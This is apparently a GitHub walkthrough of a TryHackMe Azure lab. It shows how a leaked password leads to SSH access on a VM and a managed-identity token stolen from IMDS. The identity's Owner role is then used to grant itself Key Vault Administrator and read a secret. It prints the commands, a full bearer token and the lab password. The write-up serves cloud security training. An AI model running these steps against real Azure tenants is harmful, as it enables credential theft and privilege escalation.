
<h1 align="center"><a href="https://tryhackme.com/room/eyeswideshut">Azure: Eyes Wide Shut</a></h1>
<h3 align="center">Defending Azure Learning Path &nbsp;|&nbsp; Azure Security Challenges</h3>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9414a50a-ba3e-4c51-b649-5849624dfa66"><br><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2011-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>

<h2>Task 1 . Introduction</h2>
<p>In this challenge, as a cloud pentester, you will <code>recon and attack an Azure tenant</code> to see if you can discover the attack path and move laterally to other resources.</p>

<h3>High-Level Guidance</h3>
<p>

- Perform <code>reconnaissance</code><br>
- Identify <code>attack paths</code><br>
- Determine your <code>coure of action</code><br>
- <code>Attack</code></p>

<h3>Rules of Engagement (ROE)</h3>
<p>Even if you can after successful privilege escalation or lateral movement:<br>

- Do NOT create additional users<br>
- Do NOT modify existing users<br>
- Do NOT temper with this Azure tenant by any means<br>
- This is a shared training tenant, and hence, respect the integrity of the environment<br>
- Leave it as you found it</p>

<h3>Start the Lab</h3>
<p>To start the challenge, click the <code>Cloud Details</code> button below. On the pop-up, click <code>Join Lab</code>. Then, click <code>Deploy Lab</code> in the <code>Actions</code> tab to deploy the cloud resources required for the challenge. Find your credentials in the  <code>Credentials</code> tab, click on  <code>Open Lab</code> and log in to the <a href="https://portal.azure.com/">Azure Portal</a>.<br><br>[ Cloud Details ]</p>

<p><em>Answer the question below</em></p>

<p>1.1. I have initiated the challenge deployment<br>
<code>No answer needed</code></p>

<p>
  
- <code>Cloud Details</code> > <code>Join Labs</code><br>
- <code>Actions</code> > <code>Deploy Lab</code><br>
- navigate to <code>Azure Portal</code><br>
- access Lab using <code>Username</code> and <code>Password</code> provided in the <code>Credential</code>´s section.</p>

<img width="396" height="206" alt="image" src="https://github.com/user-attachments/assets/3771bcd4-bdc3-44b8-aab5-4c1521b3bfca" />

<p>
  
- <code>Resources</code> > <code>View all resources</code></p>

<img width="1909" height="897" alt="image" src="https://github.com/user-attachments/assets/85ac21ca-9ca7-44bc-aa98-32f0e7621313" />

<p>
  
- <code>LinuxVM</code><br>
- <code>Connect</code> > <code>Connect</code><br>
- identify <code>azureuser</code><br>
- <code>Connect via Azure CLI</code><br>
- identify <code>ssh azureuser@20.42.104.23</code></p>


<img width="1894" height="901" alt="image" src="https://github.com/user-attachments/assets/766d720f-43de-4dc0-aef0-987a0f108685" />


<p>
  
- consider the discovery of <code>azureuser@20.42.104.23</code> in the reconnaissance --> <code>azureuser</code> : <code>WhereIsMyMind$#@!</code></p>


<img width="1916" height="892" alt="image" src="https://github.com/user-attachments/assets/e387843f-d756-42d8-93b5-d51652f63d2d" />


```bash
azureuser@LinuxVM:~$ curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSIsImtpZCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjI2MTg1NDksIm5iZiI6MTc2MjYxODU0OSwiZXhwIjoxNzYyNzA1MjQ5LCJhaW8iOiJBV1FBbS84YUFBQUFFRlgrOHViamhicnRzc1BvZ1V4MlloTVFTVzM4N00yY0tFWTVZSVN5QUR3dXZBVjZMbWYyQ2hMTWg5VjI0NUpiQVRGcDBiaTN5UnI3TDdKdTdkUnpERHVZUDhIdE8wdXMyNzIzYnNYTmh3S0Z0Zk1NdXpNeXBwRnRkbGxkMys2SiIsImFwcGlkIjoiOWEyNjU2NzAtZDc3MS00YWI1LTkyZGYtYjVjN2EzODFjOWUwIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNWE4ZTNkMzktNDcyMS00OTY0LThlNGEtOTY4NDMzOGQ5NzEzIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiI1YThlM2QzOS00NzIxLTQ5NjQtOGU0YS05Njg0MzM4ZDk3MTMiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJGQzh6YjhfaHhraWFVZjRUYl9ESEFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoidnhkVEw0bjBuNFVoRWsxeGdoZ29QbUs5Q0dvVUtRQkVGQy1idnlJaG9lc0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiI3IDEwIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMDgwODk0L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.XbxLltSDaMqpuWgM8OCmB6O82C4nQYZyLPPxyLEqHvpfiWSsJ-uget26TwnmaRc1X1zakUuzRN6wAWbAsE0V-Q2rzIRW1HtRBR3Hu-NyDTGmWgKbXp7U-CmPf-YpCGVUxy8eXqZPeIOtA0CVRGFK_66nrkL0rdXk97ultDybO-UML47yKWed3I4m3rp1E_SJKSnNEcCi6GW931n80KS-dkMBJSrKvTMAHDWkLikOKSjiFSv_OhrKava0sjv5oERXGzHr2Ncd-iIb97-kIWNcQexYOQ5LLlqOaDZXO5iJWWBZJi7JnoTrACokyBLmMoGqvrWNn-KpAY6WHSipX_QM2w","client_id":"9a265670-d771-4ab5-92df-b5c7a381c9e0","expires_in":"85829","expires_on":"1762705249","ext_expires_in":"86399","not_before":"1762618549","resource":"https://management.azure.com/","token_type":"Bearer"}
```

```bash
Connect-AzAccount -AccessToken eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSIsImtpZCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjI2MTg1NDksIm5iZiI6MTc2MjYxODU0OSwiZXhwIjoxNzYyNzA1MjQ5LCJhaW8iOiJBV1FBbS84YUFBQUFFRlgrOHViamhicnRzc1BvZ1V4MlloTVFTVzM4N00yY0tFWTVZSVN5QUR3dXZBVjZMbWYyQ2hMTWg5VjI0NUpiQVRGcDBiaTN5UnI3TDdKdTdkUnpERHVZUDhIdE8wdXMyNzIzYnNYTmh3S0Z0Zk1NdXpNeXBwRnRkbGxkMys2SiIsImFwcGlkIjoiOWEyNjU2NzAtZDc3MS00YWI1LTkyZGYtYjVjN2EzODFjOWUwIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNWE4ZTNkMzktNDcyMS00OTY0LThlNGEtOTY4NDMzOGQ5NzEzIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiI1YThlM2QzOS00NzIxLTQ5NjQtOGU0YS05Njg0MzM4ZDk3MTMiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJGQzh6YjhfaHhraWFVZjRUYl9ESEFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoidnhkVEw0bjBuNFVoRWsxeGdoZ29QbUs5Q0dvVUtRQkVGQy1idnlJaG9lc0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiI3IDEwIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMDgwODk0L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.XbxLltSDaMqpuWgM8OCmB6O82C4nQYZyLPPxyLEqHvpfiWSsJ-uget26TwnmaRc1X1zakUuzRN6wAWbAsE0V-Q2rzIRW1HtRBR3Hu-NyDTGmWgKbXp7U-CmPf-YpCGVUxy8eXqZPeIOtA0CVRGFK_66nrkL0rdXk97ultDybO-UML47yKWed3I4m3rp1E_SJKSnNEcCi6GW931n80KS-dkMBJSrKvTMAHDWkLikOKSjiFSv_OhrKava0sjv5oERXGzHr2Ncd-iIb97-kIWNcQexYOQ5LLlqOaDZXO5iJWWBZJi7JnoTrACokyBLmMoGqvrWNn-KpAY6WHSipX_QM2w","client_id":"9a265670-d771-4ab5-92df-b5c7a381c9e0 -AccountId 9a265670-d771-4ab5-92df-b5c7a381c9e0
```

<br>
<h2>Task 2 . Managed Identities</h2>
<p>A managed identity is a special type of service principal that can only be used with Azure resources. It provides an identity for applications to use when connecting to services that support Entra ID authentication. By using managed identities, developers can avoid managing credentials manually, simplifying security and reducing potential risks.<br>

For instance, suppose we want the managed identity assigned to our Azure virtual machine (VM) to access a Key Vault. All we need to do is assign the appropriate RBAC (Role-Based Access Control) role. When the VM attempts to access the Key Vault, it receives a token from the Instance Metadata Service (IMDS)—a backend service running on all Azure VMs. This service detects the attached managed identity and handles authentication automatically without requiring any hardcoded credentials.</p>

<h6 align="center"><img width="250px" src="https://github.com/user-attachments/assets/8fcb7fdd-2a7b-46ce-b32c-d5d2d15bf303"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h3>Types of Managed Identities</h3>
<p><code>System-Assigned Managed Identity</code>

- Automatically created and tied to a specific Azure resource (e.g., Virtual Machine, App Service).<br>
- When the resource is deleted, the identity is also deleted.<br>
- Only one system-assigned identity per resource.</p>

<p><code>User-Assigned Managed Identity</code>

- Created as a standalone Azure resource.<br>
- Can be assigned to one or more Azure resources.<br>
- Managed independently of the lifecycle of the resources it's assigned to.</p>

<h3>Key Benefits</h3>
<p>

- <code>No credential management</code>: Azure handles credential rotation and storage.<br>
- <code>Improved security</code>: Reduces the risk of leaking secrets or keys.<br>
- <code>Simplified access control</code>: Can be granted permissions via Azure RBAC or Entra ID.</p>

<p><em>Answer the question below</em></p>

<p>2.1. What type of managed identity's life cycle is independent from the resource? <br>
<code>•••••••••••••</code></p>

<br>
<h2>Task 3 . Attack Scenarios</h2>
<p>Managed identities in Azure are a powerful feature that improves security by eliminating the need to manage secrets or credentials manually. However, like any access control mechanism, <code>if misconfigured or compromised</code>, they can be abused by attackers.</p>

<h6 align="center"><img width="250px" src="https://github.com/user-attachments/assets/9e30439e-2131-48ee-9ef0-0e506b016809"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Here are several ways <code>Managed Identities</code> (MIs) can be exploited in an attack scenario:</p>

<h3>1. Privilege Escalation via Over-Permissioned Managed Identities</h3>
<p>If a managed identity is assigned overly permissive roles (e.g., <code>Contributor</code>, <code>Owner</code>, or <code>Key Vault Administrator</code>), an attacker who gains access to that identity (e.g., via a compromised VM or App Service) can perform high-privilege actions:<br>

- Access secrets in Azure Key Vault<br>
- Modify or delete Azure resources<br>
- Deploy new infrastructure</p>

<h3>2. Lateral Movement Between Resources</h3>
<p>Once an attacker compromises a resource (such as a VM or container), they can use the managed identity token from the <code>Instance Metadata Service</code> (IMDS) to:<br>
- Access other Azure services (e.g., storage, databases, Key Vaults)
- Move to other services where the identity has access, facilitating further exploitation</p>

<h3>3. Token Theft via the IMDS (Instance Metadata Service) Endpoint</h3>
<p>Azure VMs and other compute resources expose the IMDS endpoint at <code>http://xxx.xxx.xxx.xxx/</code>. If an attacker gains access to the machine (even via limited command execution), they can:<br>

- Query IMDS to obtain an access token for the managed identity<br>
- Use this token to access any Azure resource the identity is authorized for</p>

<h3>4. Persistence Through Managed Identity Abuse</h3>
<p>If an attacker compromises a resource and that resource's managed identity has write access to automation accounts, Logic Apps, or Functions, they could:<br>
- Create persistent scripts or backdoors<br>
- Establish scheduled tasks that keep calling external C2 (command and control) servers</p>

<h3>5. Misuse of User-Assigned Managed Identities (UAMI)</h3>
<p>User-assigned MIs can be attached/detached from different resources. If an attacker finds a UAMI with high privileges:<br>
- They could attach it to a compromised resource (like a VM they control)<br>
- Use the new token to escalate privileges or exfiltrate data</p>

<p>As listed above, there is quite a bit of attack surface when it comes to managed identities. Discovering the gaps and employing these techniques will depend on what type of managed identities are utilized and with which type of permissions.</p>

<p><em>Answer the question below</em></p>

<p>3.1. Where can the attackers obtain a token of managed identity if a resource is compromised?<br>
<code>•••••••• •••••••• •••••••</code></p>

<p align="left">Access the IMDS endpoint at http://xxx.xxx.xxx.xxx/<br><img width="700px" src="https://github.com/user-attachments/assets/f1d621b2-4c30-4519-97ee-cb2c7cef3b04"></p>

<br>
<h2>Task 4. Attack</h2>

<h6 align="center"><img width="250px" src="https://github.com/user-attachments/assets/8e5e19c7-bcc4-490b-89ca-45b8c8fdc013"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h3>Lab Scenario</h3>
<p>

- During the reconnaissance, you came across a password: <code>WhereIsMyMind$#@!</code><br>
- You don't know much about which permissions you have on the Azure Portal.<br>
- You don't know much about which resources you can access on the Azure Portal.<br>
- All you have is a compromised password!<br>
- How far can you go with it?<br>
- Which attack path(s) can you discover and how will you exploit it?<br>

Show us what you can do with the compromised password and the managed identities!<br>

Good luck!</p>

<p><em>Answer the questions below</em></p>

<p>4.1. Where can the attackers obtain a token of managed identity if a resource is compromised?<br>
<code>••••••••••••••••• ••••••• ••••••••••</code></p>

<p>4.2. What is the flag?<br>
<code>THM{••••••••••••••••••••••••••••••••••••}</code></p>

<br>
<h3>Phase 1: Initial Access and Environment Reconnaissance</h3>
<p>After obtaining compromised credentials for a legitimate user, the first step is to establish a remote session and identify the scope of the available resources.</p>
<p>

- <code>Authentication and Portal Navigation</code> &nbsp; : &nbsp; Access the target environment via the Azure Web Portal using the provided temporary credentials.<br>- &nbsp;&nbsp; Navigate to the <strong>Azure Portal</strong><br>- &nbsp;&nbsp; Enter the provided &nbsp; <strong>Username</strong>  &nbsp; and  &nbsp; <strong>Temporary Access Pass</strong> (TAP)<br>- &nbsp;&nbsp; Click &nbsp; <strong>Sign In</strong> and bypass any "Stay Signed In" prompts to maintain a clean session.<br>- &nbsp;&nbsp; Navigate to &nbsp; <strong>All Resources</strong> and locate the <strong>Linux VM</strong><br>- &nbsp;&nbsp; Select the &nbsp; <strong>Connect</strong> blade to retrieve the public IP and connection string.<br>

<img width="1906" height="524" alt="image" src="https://github.com/user-attachments/assets/09b963bb-20f3-4ba1-a749-a52892dc94f5" /><br>

<img width="1903" height="453" alt="image" src="https://github.com/user-attachments/assets/4e598342-6403-4af4-9d78-7866f1e370be" /><br>

<img width="1229" height="567" alt="image" src="https://github.com/user-attachments/assets/c24cb619-1a8b-4a92-9071-e8b4290f979a" /><br> 

<img width="1914" height="781" alt="image" src="https://github.com/user-attachments/assets/44434ab6-7838-4384-bdc8-1671b8a808ff" /><br>

- <code>Host Access via SSH</code> &nbsp; : &nbsp; Establish a secure shell session to the target instance.<br>- &nbsp;&nbsp; Use the compromised password <code>WhereIsMyMind$#@!</code> to authenticate.<br>


```bash
:~# ssh azureuser@xx.xx.xxx.xx
```

<img width="1244" height="818" alt="image" src="https://github.com/user-attachments/assets/ac6a4a30-d8c8-4107-a881-5e60010e3433" /><br>

<img width="1247" height="129" alt="image" src="https://github.com/user-attachments/assets/01276862-8d5a-4cd6-8791-87aaa73230fb" /><br>


- <code>Azure CLI Installation</code> (Environment Preparation)&nbsp; : &nbsp; In many lean Linux environments, the Azure Command-Line Interface (CLI) may not be pre-installed. Deploying the CLI is essential for interacting with the Azure Resource Manager (ARM) from the terminal.<br>- &nbsp;&nbsp;- Install the Azure CLI using the official Microsoft deployment script.<br>

```bash
azureuser@LinuxVM:~$ curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

- <code>Identify the Managed Identity</code> &nbsp; : &nbsp; query the Azure Instance Metadata Service (IMDS) to check for an associated identity. Then, use the Azure CLI to confirm the Principal ID of the System-Assigned Identity.<br>Discovered:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>PrincipalId</strong> &nbsp; : &nbsp; 28f4a797-3557-4841-b340-e22b2818ed06<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>TenantId</strong> &nbsp; : &nbsp; 91716a9a-f8ff-490f-8f3a-f2e6da6e1165<br>

```bash
azureuser@LinuxVM:~$ az login --identity
[
  {
    "environmentName": "AzureCloud",
    "homeTenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
    "id": "1746294a-5aa8-4cbb-82a4-11e731b20942",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-B2C-1",
    "state": "Enabled",
    "tenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
    "user": {
      "assignedIdentityInfo": "MSI",
      "name": "systemAssignedIdentity",
      "type": "servicePrincipal"
    }
  }
]
```

```bash
azureuser@LinuxVM:~/.azure$ az vm identity show -g rg-01119503 -n LinuxVM
{
  "principalId": "28f4a797-3557-4841-b340-e22b2818ed06",
  "tenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
  "type": "SystemAssigned",
  "userAssignedIdentities": null
}
```

- <code>Enumerate Cloud Resources</code> &nbsp; : &nbsp; list all resources within the identified Resource Group (rg-01119503) to locate high-value targets like Azure Key Vaults.<br>Discovered:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>Key Vault</strong> &nbsp; : &nbsp; <strong>akv-01119503</strong></p>

```bash
azureuser@LinuxVM:~$ az resource list -g rg-01119503 -o table
Name                                            ResourceGroup    Location    Type                                     Status
----------------------------------------------  ---------------  ----------  ---------------------------------------  ---------
LinuxVMNSG                                      rg-01119503      eastus      Microsoft.Network/networkSecurityGroups  Succeeded
LinuxVMPublicIP                                 rg-01119503      eastus      Microsoft.Network/publicIPAddresses      Succeeded
LinuxVMVNET                                     rg-01119503      eastus      Microsoft.Network/virtualNetworks        Succeeded
akv-01119503                                    rg-01119503      eastus      Microsoft.KeyVault/vaults                Succeeded
LinuxVMVMNic                                    rg-01119503      eastus      Microsoft.Network/networkInterfaces      Succeeded
LinuxVM                                         rg-01119503      eastus      Microsoft.Compute/virtualMachines        Succeeded
LinuxVM_disk1_ee76848abbd34df6b9a95414fa6bd668  RG-01119503      eastus      Microsoft.Compute/disks                  Succeeded
```

<br>
<h3>Phase 2: Privilege Discovery and Escalation</h3>
<p>The "Over-Permissioned" vulnerability is confirmed by analyzing the Role-Based Access Control (RBAC) assignments for the VM's identity.</p>
<p>

- <code>Check Role Assignments</code> &nbsp; : &nbsp; identify the specific permissions granted to the Managed Identity at the Resource Group scope.<br>Discovered that the identity is assigned the <strong>Owner</strong> role. While this grants control over the Resource Group, it does not automatically grant <strong>Data Plane</strong> access to Key Vault secrets if RBAC authorization is enabled.<br>

```bash
azureuser@LinuxVM:~$ az role assignment list --assignee 28f4a797-3557-4841-b340-e22b2818ed06 --all -o table

Principal                             Role    Scope
------------------------------------  ------  ------------------------------------------------------------------------------
ab6f2bfb-7289-4c6f-9f00-c227b43d1846  Owner   /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourcegroups/rg-01119503
```

- <code>Escalate to Data Plane Administrator</code> &nbsp; : &nbsp; leverage the <strong>Owner</strong> role to grant the identity the <strong>Key Vault Administrator</strong> role. This role provides the necessary permissions to manage and read secrets.<br>

```bash
azureuser@LinuxVM:~$ az role assignment create --role "Key Vault Administrator" --assignee 28f4a797-3557-4841-b340-e22b2818ed06 --scope /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-01119503
{
  "condition": null,
  "conditionVersion": null,
  "createdBy": null,
  "createdOn": "2026-01-11T19:49:09.545498+00:00",
  "delegatedManagedIdentityResourceId": null,
  "description": null,
  "id": "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-01119503/providers/Microsoft.Authorization/roleAssignments/49d1011b-3a02-45ba-9fed-eef337e80998",
  "name": "49d1011b-3a02-45ba-9fed-eef337e80998",
  "principalId": "28f4a797-3557-4841-b340-e22b2818ed06",
  "principalType": "ServicePrincipal",
  "resourceGroup": "rg-01119503",
  "roleDefinitionId": "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/providers/Microsoft.Authorization/roleDefinitions/00482a5a-887f-4fb3-b363-3b7fe8e74483",
  "scope": "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-01119503",
  "type": "Microsoft.Authorization/roleAssignments",
  "updatedBy": "28f4a797-3557-4841-b340-e22b2818ed06",
  "updatedOn": "2026-01-11T19:49:09.681493+00:00"
}
```

- <code>Refresh Identity Token:</code> &nbsp; : &nbsp; log out and re-authenticate via the Managed Identity to ensure the new RBAC permissions are reflected in the access token.</p>

```bash
azureuser@LinuxVM:~$ az logout
```

```bash
azureuser@LinuxVM:~$ az login --identity
[
  {
    "environmentName": "AzureCloud",
    "homeTenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
    "id": "1746294a-5aa8-4cbb-82a4-11e731b20942",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-B2C-1",
    "state": "Enabled",
    "tenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
    "user": {
      "assignedIdentityInfo": "MSI",
      "name": "systemAssignedIdentity",
      "type": "servicePrincipal"
    }
  }
]
```

<br>
<h3>Phase 3: Exfiltration of Sensitive Data</h3>
<p>With the escalated permissions, the final phase involves querying the Key Vault's data plane to retrieve the target secret.</p>
<p>

- <code>List Key Vault Secrets</code> &nbsp; : &nbsp; identify the names of the secrets stored within the vault.<br>Discovered <strong>flag</strong>.<br>

```bash
azureuser@LinuxVM:~$ az keyvault secret list --vault-name akv-01119503 --query "[].name" -o tsv
flag
```

- <code>Retrieve Secret Value</code> &nbsp; : &nbsp; extract the plaintext value of the identified secret to complete the objective.<br>

```bash
azureuser@LinuxVM:~$ az keyvault secret show --vault-name akv-01119503 --name "flag" --query value -o tsv
THM{••••••••••••••••••••••••••••••••••••}
```

<br>
<br>
<h1 align="center">Challenge Completed</h1>


<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3402a3a7-05c2-4938-b81f-fdbf08e252b4"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/00af049d-3126-4a27-8249-c15755bdd685"></p>

<h1 align="center">Defending Azure Learning Path</h1>
<p align="center"><img height="370px" src="https://github.com/user-attachments/assets/59798f69-9c78-4454-bad0-d8de03dda952">
                  <img height="267px" src="https://github.com/user-attachments/assets/a9e6fd21-6873-468c-b501-7cb34b478247"><br>
                  <img width="620px" src="https://github.com/user-attachments/assets/c7cd8ea2-168f-4a1d-80ca-8808c25f0159"><br></p>


<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|11     |Medium 🚩 - Azure: Eyes Wide Shut     |10 |     86ᵗʰ  |     3ʳᵈ    |      558ᵗʰ   |        5ᵗʰ     |    138,450  |    1,063    |    86     |
|8      |Medium ⚙️ - Phishing Unfolding        | 7 |     86ᵗʰ  |     3ʳᵈ    |      508ᵗʰ   |        4ᵗʰ     |    138,372  |    1,062    |    84     |
|8      |Easy ⚙️ - Introduction to Phishing    | 7 |     96ᵗʰ  |     3ʳᵈ    |    2,479ᵗʰ   |       32ⁿᵈ     |    137,117  |    1,062    |    84     |
|8      |Medium 🔗 - KaffeeSec - SoMeSINT      | 7 |     98ᵗʰ  |     3ʳᵈ    |    2,847ᵗʰ   |       38ᵗʰ     |    137,052  |    1,062    |    84     |
|7      |Hard 🚩 - Hack Back                   | 6 |     98ᵗʰ  |     3ʳᵈ    |    2,798ᵗʰ   |       37ᵗʰ     |    136,908  |    1,061    |    84     |
|7      |Hard 🚩 - Dead End?                   | 6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
|6      |Easy 🔗 - Linux Strength Training     | 5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
|4      |Medium 🚩 - JVM Reverse Engineering   | 3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
|3      |Medium 🚩 - Carrotbane of My Existence| 2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
|2      |Easy 🔗 - Learn Rust                  | 1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |


</h6></div><br>


<p align="center">Global All Time:    86ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/8304c2ee-8f3a-45da-bda9-0a8ff5eab4e8"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/ade96483-6f31-4489-936a-0a8d3c821122"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/8356d7d7-ed2e-4961-9731-9edf4635a484"><br><br>
                  Global monthly:     558ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/37bbbd30-2ed4-4209-8347-9097a71c9d4c"><br><br>
                  Brazil monthly:       5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7a24a464-82ae-4571-bf5c-f55591ecccfa"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
